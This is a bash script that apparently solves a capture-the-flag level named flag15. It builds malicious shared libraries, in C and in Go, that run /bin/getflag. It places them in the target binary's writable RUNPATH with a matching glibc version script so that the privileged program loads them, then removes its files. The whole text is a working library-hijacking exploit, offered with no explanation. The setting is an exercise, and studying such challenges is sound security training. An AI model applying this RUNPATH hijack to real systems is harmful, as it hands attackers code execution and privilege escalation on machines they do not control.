#!/usr/bin/env bash

# TODO

cat >/tmp/flag15.c <<EOF
#include<stdlib.h>
int __libc_start_main(
    int (*main) (int, char**, char**),
    int argc,
    char** ubp_av,
    void (*init) (void),
    void (*fini) (void),
    void (*rtld_fini) (void),
    void (*stack_end)
) {
    init();
    system("/bin/getflag");
    main(0, 0, 0);
    fini();
    return 0;
}
EOF

cat >/tmp/flag15.go <<EOF
package main

import (
    "os"
    "os/exec"
)

func init() {
    var c *exec.Cmd = exec.Command("/bin/getflag")

    c.Stdout = os.Stdout
    c.Run()
}

func main() {}
EOF

needed="$(objdump -p /home/flag15/flag15 | awk '/NEEDED/ {print $2}')"
rpath="$(objdump -p /home/flag15/flag15 | awk '/RUNPATH/ {print $2}')"

while read -r version; do
    echo "$version{};"
done >/tmp/flag15.ver < <(
    objdump -p /home/flag15/flag15 | awk '/GLIBC_/ {print $4}'
); unset version

gcc --no-pie -o "$rpath/$needed" -shared -static-libgcc \
    -Wl,-Bstatic,--version-script=/tmp/flag15.ver /tmp/flag15.c

/home/flag15/flag15

go build --buildmode=c-shared \
    --ldflags="-extldflags=-Wl,--version-script=/tmp/flag15.ver" \
    -o "$rpath/$needed" /tmp/flag15.go

/home/flag15/flag15
/home/flag15/flag15.1

rm -f "$rpath/$needed" /tmp/flag15*
